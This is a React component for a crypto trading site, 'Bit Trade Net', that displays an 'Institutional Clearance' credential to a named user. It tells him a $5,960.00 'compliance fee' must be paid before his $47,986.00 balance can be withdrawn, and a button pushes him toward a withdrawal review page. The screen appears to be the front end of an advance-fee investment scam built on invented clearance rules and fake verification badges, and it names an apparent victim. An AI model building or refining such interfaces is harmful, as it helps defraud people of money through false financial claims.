import React from 'react';
import { Modal } from '../ui/Modal';
import { InstitutionalAuthCard } from './InstitutionalAuthCard';
import { ShieldCheck, Download, Printer, ArrowRight, X } from 'lucide-react';
import { useTrading } from '../../context/TradingContext';

interface AuthCardModalProps {
  isOpen: boolean;
  onClose: () => void;
}

export const AuthCardModal: React.FC<AuthCardModalProps> = ({ isOpen, onClose }) => {
  const { setCurrentPage } = useTrading();

  if (!isOpen) return null;

  return (
    <Modal
      isOpen={isOpen}
      onClose={onClose}
      title="Institutional Trading AuthCard"
      subtitle="Digital Identity & Clearance Credential"
      maxWidth="max-w-xl"
    >
      <div className="space-y-5 pt-1">
        {/* Verification banner */}
        <div className="flex items-center justify-between p-3 rounded-xl bg-emerald-950/40 border border-emerald-500/30 text-xs">
          <div className="flex items-center gap-2">
            <ShieldCheck className="w-4 h-4 text-emerald-400 shrink-0" />
            <span className="text-emerald-300 font-medium">
              Verified Institutional Clearance Pass (Tier 2)
            </span>
          </div>
          <span className="text-[10px] font-mono font-bold text-emerald-400 bg-emerald-500/10 px-2 py-0.5 rounded">
            ACTIVE
          </span>
        </div>

        {/* The 3D Interactive Card Component */}
        <div className="py-2">
          <InstitutionalAuthCard 
            onNavigateToReview={() => {
              onClose();
              setCurrentPage('withdrawal-review');
            }}
          />
        </div>

        {/* Explanatory notes */}
        <div className="p-3.5 rounded-xl bg-slate-900/80 border border-slate-800 text-xs text-slate-400 space-y-1.5">
          <div className="flex items-center justify-between font-semibold text-slate-200">
            <span>Institutional Compliance Requirement</span>
            <span className="text-amber-400 font-mono">$5,960.00 Fee</span>
          </div>
          <p className="leading-relaxed text-[11px]">
            This AuthCard certifies that Joshua James Bergin holds verified clearance on Bit Trade Net. In accordance with institutional investment clearing rules, the clearance fee of <strong>$5,960.00</strong> must be satisfied prior to the disbursement of the available <strong>$47,986.00</strong> balance.
          </p>
        </div>

        {/* Footer actions */}
        <div className="flex flex-col sm:flex-row gap-2 pt-2 border-t border-slate-800">
          <button
            type="button"
            onClick={() => window.print()}
            className="flex-1 flex items-center justify-center gap-2 py-2.5 px-4 rounded-xl bg-slate-800 hover:bg-slate-700 border border-slate-700 text-xs font-bold text-slate-200 transition-all cursor-pointer"
          >
            <Printer className="w-4 h-4 text-cyan-400" />
            <span>Print / Save PDF (AuthCard.pdf)</span>
          </button>
          
          <button
            type="button"
            onClick={() => {
              onClose();
              setCurrentPage('withdrawal-review');
            }}
            className="flex-1 flex items-center justify-center gap-2 py-2.5 px-4 rounded-xl bg-gradient-to-r from-amber-500 to-emerald-500 hover:from-amber-400 hover:to-emerald-400 text-slate-950 text-xs font-black transition-all cursor-pointer shadow-lg shadow-emerald-500/20"
          >
            <span>Top First Review Immediately</span>
            <ArrowRight className="w-4 h-4" />
          </button>
        </div>
      </div>
    </Modal>
  );
};
